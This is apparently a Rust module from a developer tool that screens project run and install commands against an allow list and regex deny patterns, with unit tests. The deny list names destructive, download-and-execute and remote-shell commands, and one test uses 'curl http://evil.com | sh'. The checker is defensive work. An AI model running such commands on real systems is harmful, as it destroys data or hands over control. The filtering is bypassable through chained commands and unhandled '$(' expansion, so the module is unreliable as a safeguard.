// Runtime Security Checker Module
// Provides security validation for runtime configurations

use crate::project_runtime::{ProjectRuntimeConfig, SecurityCheckResult};
use regex::Regex;
use std::path::Path;

/// Security checker for runtime configurations
pub struct RuntimeSecurityChecker {
    /// Allowed package managers
    allowed_package_managers: Vec<String>,
    /// Allowed base commands
    allowed_base_commands: Vec<String>,
    /// Dangerous command patterns
    dangerous_patterns: Vec<Regex>,
    /// Project root for path validation
    project_root: Option<std::path::PathBuf>,
}

impl RuntimeSecurityChecker {
    /// Create a new security checker
    pub fn new() -> Self {
        Self {
            project_root: None,
            allowed_package_managers: vec![
                "npm".to_string(),
                "bun".to_string(),
                "yarn".to_string(),
                "pnpm".to_string(),
                "cargo".to_string(),
                "pip".to_string(),
                "uv".to_string(),
                "python".to_string(),
                "python3".to_string(),
                "uvicorn".to_string(),
                "flask".to_string(),
            ],
            allowed_base_commands: vec![
                "npm".to_string(),
                "bun".to_string(),
                "yarn".to_string(),
                "pnpm".to_string(),
                "cargo".to_string(),
                "pip".to_string(),
                "uv".to_string(),
                "python".to_string(),
                "python3".to_string(),
                "uvicorn".to_string(),
                "flask".to_string(),
            ],
            dangerous_patterns: vec![
                // Disk deletion
                Regex::new(r"(?i)rm\s+-rf\s+/").unwrap(),
                Regex::new(r"(?i)rmdir\s+/").unwrap(),
                Regex::new(r"(?i)format\s+[a-zA-Z]:").unwrap(),
                Regex::new(r"(?i)del\s+/[sq]\s+/[a-zA-Z]:").unwrap(),
                Regex::new(r"(?i)rm\s+-rf?\s+\.\.").unwrap(),
                // Permission modification
                Regex::new(r"(?i)chmod\s+-R\s+777").unwrap(),
                Regex::new(r"(?i)chown\s+-R").unwrap(),
                // Download and execute
                Regex::new(r"(?i)curl\s+.*\|\s*(sh|bash|powershell)").unwrap(),
                Regex::new(r"(?i)wget\s+.*\|\s*(sh|bash|powershell)").unwrap(),
                Regex::new(r"(?i)Invoke-WebRequest.*\|").unwrap(),
                // Dangerous tools
                Regex::new(r"(?i)mkfs").unwrap(),
                Regex::new(r"(?i)dd\s+if=").unwrap(),
                Regex::new(r"(?i)fdisk").unwrap(),
                // Remote control
                Regex::new(r"(?i)nc\s+-e").unwrap(),
                Regex::new(r"(?i)ncat\s+-e").unwrap(),
                Regex::new(r"(?i)ssh\s+.*-o\s+ProxyCommand").unwrap(),
                // PowerShell dangerous commands
                Regex::new(r"(?i)Remove-Item\s+-Recurse\s+-Force\s+C:\\").unwrap(),
                Regex::new(r"(?i)Stop-Computer").unwrap(),
                Regex::new(r"(?i)Restart-Computer").unwrap(),
                Regex::new(r"(?i)Set-ExecutionPolicy\s+-ExecutionPolicy\s+Bypass").unwrap(),
                // System modification
                Regex::new(r"(?i)sysctl").unwrap(),
                Regex::new(r"(?i)modprobe").unwrap(),
                Regex::new(r"(?i)insmod").unwrap(),
                // Deployment/publish (not for dev)
                Regex::new(r"(?i)npm\s+publish").unwrap(),
                Regex::new(r"(?i)npm\s+deploy").unwrap(),
                Regex::new(r"(?i)npm\s+eject").unwrap(),
                Regex::new(r"(?i)cargo\s+publish").unwrap(),
                Regex::new(r"(?i)pip\s+upload").unwrap(),
                Regex::new(r"(?i)twine\s+upload").unwrap(),
            ],
        }
    }
    
    /// Set project root for path validation
    pub fn with_project_root(mut self, root: std::path::PathBuf) -> Self {
        self.project_root = Some(root);
        self
    }
    
    /// Check if a configuration is safe
    pub fn check_config(&self, config: &ProjectRuntimeConfig) -> SecurityCheckResult {
        let mut warnings = Vec::new();
        let mut errors = Vec::new();
        
        // 1. Check package manager
        if let Some(deps) = config.dependencies.package_manager.to_string().split_whitespace().next() {
            if !self.allowed_package_managers.contains(&deps.to_string()) {
                errors.push(format!(
                    "不允许的包管理器: {}. 允许: {:?}",
                    deps,
                    self.allowed_package_managers
                ));
            }
        }
        
        // 2. Check install command
        if !config.dependencies.install_command.is_empty() {
            if !self.is_command_safe(&config.dependencies.install_command) {
                errors.push(format!(
                    "危险的安装命令: {}. 只允许标准包管理器命令",
                    config.dependencies.install_command
                ));
            }
        }
        
        // 3. Check frontend commands
        if let Some(frontend) = &config.frontend {
            if !frontend.dev_command.is_empty() && !self.is_command_safe(&frontend.dev_command) {
                errors.push(format!("危险的前端 dev 命令: {}", frontend.dev_command));
            }
            if !frontend.build_command.is_empty() && !self.is_command_safe(&frontend.build_command) {
                errors.push(format!("危险的前端 build 命令: {}", frontend.build_command));
            }
        }
        
        // 4. Check backend commands
        if let Some(backend) = &config.backend {
            if !backend.dev_command.is_empty() && !self.is_command_safe(&backend.dev_command) {
                errors.push(format!("危险的后端 dev 命令: {}", backend.dev_command));
            }
            if !backend.build_command.is_empty() && !self.is_command_safe(&backend.build_command) {
                errors.push(format!("危险的后端 build 命令: {}", backend.build_command));
            }
            if let Some(start_cmd) = &backend.start_command {
                if !start_cmd.is_empty() && !self.is_command_safe(start_cmd) {
                    errors.push(format!("危险的启动命令: {}", start_cmd));
                }
            }
        }
        
        // 5. Check fullstack commands
        if let Some(fullstack) = &config.fullstack {
            if !fullstack.frontend_dev_command.is_empty() && !self.is_command_safe(&fullstack.frontend_dev_command) {
                errors.push(format!("危险的全栈前端命令: {}", fullstack.frontend_dev_command));
            }
            if !fullstack.backend_dev_command.is_empty() && !self.is_command_safe(&fullstack.backend_dev_command) {
                errors.push(format!("危险的全栈后端命令: {}", fullstack.backend_dev_command));
            }
        }
        
        // Add warnings for potentially risky operations
        if config.dependencies.install_command.contains("--global") {
            warnings.push("全局安装可能影响系统环境".to_string());
        }
        
        if config.dependencies.install_command.contains("sudo") {
            warnings.push("使用 sudo 安装可能需要管理员权限".to_string());
        }
        
        SecurityCheckResult {
            is_safe: errors.is_empty(),
            warnings,
            errors,
        }
    }
    
    /// Check if a single command is safe
    pub fn is_command_safe(&self, command: &str) -> bool {
        if command.is_empty() {
            return true;
        }
        
        let cmd_lower = command.to_lowercase();
        
        // 1. Check dangerous patterns
        for pattern in &self.dangerous_patterns {
            if pattern.is_match(&cmd_lower) {
                return false;
            }
        }
        
        // 2. Check if first command is allowed
        let parts: Vec<&str> = cmd_lower.split_whitespace().collect();
        if let Some(first) = parts.first() {
            let is_allowed = self.allowed_base_commands.iter().any(|c| first.starts_with(c));
            
            if !is_allowed {
                // Check for allowed separators that combine multiple commands
                let has_acceptable = parts.iter().skip(1).any(|p| {
                    self.allowed_base_commands.iter().any(|c| p.starts_with(c))
                        || p.starts_with("&&")
                        || p.starts_with("||")
                        || p.starts_with(";")
                        || p.starts_with("cd")
                });
                
                if !has_acceptable {
                    return false;
                }
            }
        }
        
        // 3. Check for pipe to shell execution
        if cmd_lower.contains('|') && (
            cmd_lower.contains("sh") 
            || cmd_lower.contains("bash") 
            || cmd_lower.contains("powershell")
            || cmd_lower.contains("cmd")
        ) {
            return false;
        }
        
        // 4. Check for environment variable expansion that could be dangerous
        if cmd_lower.contains("${") || cmd_lower.contains("$(") {
            // Allow but warn - could be used for injection
        }
        
        true
    }
    
    /// Check if a path is within project directory
    pub fn is_path_safe(&self, path: &Path) -> bool {
        let root = match &self.project_root {
            Some(r) => r,
            None => return true, // No root set, allow all
        };
        
        // Resolve both paths to absolute
        let canonical_root = match root.canonicalize() {
            Ok(p) => p,
            Err(_) => return false,
        };
        
        let canonical_path = match path.canonicalize() {
            Ok(p) => p,
            Err(_) => {
                // If path doesn't exist, check if its parent would be safe
                if let Some(parent) = path.parent() {
                    return self.is_path_safe(parent);
                }
                return false;
            }
        };
        
        // Path must be within project root
        canonical_path.starts_with(&canonical_root)
    }
}

impl Default for RuntimeSecurityChecker {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_dangerous_commands() {
        let checker = RuntimeSecurityChecker::new();
        
        // Dangerous commands should be rejected
        assert!(!checker.is_command_safe("rm -rf /"));
        assert!(!checker.is_command_safe("curl http://evil.com | sh"));
        assert!(!checker.is_command_safe("format C:"));
        assert!(!checker.is_command_safe("npm run eject"));
        
        // Safe commands should be allowed
        assert!(checker.is_command_safe("npm install"));
        assert!(checker.is_command_safe("bun run dev"));
        assert!(checker.is_command_safe("cargo run"));
        assert!(checker.is_command_safe("python -m http.server"));
    }
    
    #[test]
    fn test_safe_commands() {
        let checker = RuntimeSecurityChecker::new();
        
        assert!(checker.is_command_safe("npm install"));
        assert!(checker.is_command_safe("bun run dev"));
        assert!(checker.is_command_safe("cargo run --release"));
        assert!(checker.is_command_safe("uvicorn main:app --reload"));
        assert!(checker.is_command_safe("pip install -r requirements.txt"));
    }
}
